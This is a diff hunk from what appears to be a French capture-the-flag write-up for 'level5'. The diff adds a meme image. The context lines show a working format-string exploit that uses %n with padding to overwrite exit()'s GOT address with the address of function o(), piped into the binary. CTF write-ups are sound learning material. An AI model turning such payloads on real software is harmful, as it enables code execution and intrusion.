@@ -158,7 +158,8 @@ AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 
 
 On va à nouveau se servir du modifier %n pour écrire l'adresse de o() dans l'adresse du exit(), pour ca on va mettre autant de padding que la représentation en int de o(), moins 4 octets pour l'adresse de exit():
 - `python -c 'print"\x38\x98\x04\x08%1$" + str(int(0x080484a4) - 4) + "d%4$n"' > /tmp/exploit`
-- `cat /tmp/exploit - | ./level5`
+- `cat /tmp/exploit - | ./level5`<br/>
+  <img src="https://vignette.wikia.nocookie.net/spongebob/images/f/f7/Two_hours_later.jpg/revision/latest?cb=20101111022814" style="width: 350px;"/><br/>
   ```
                                     512
                   
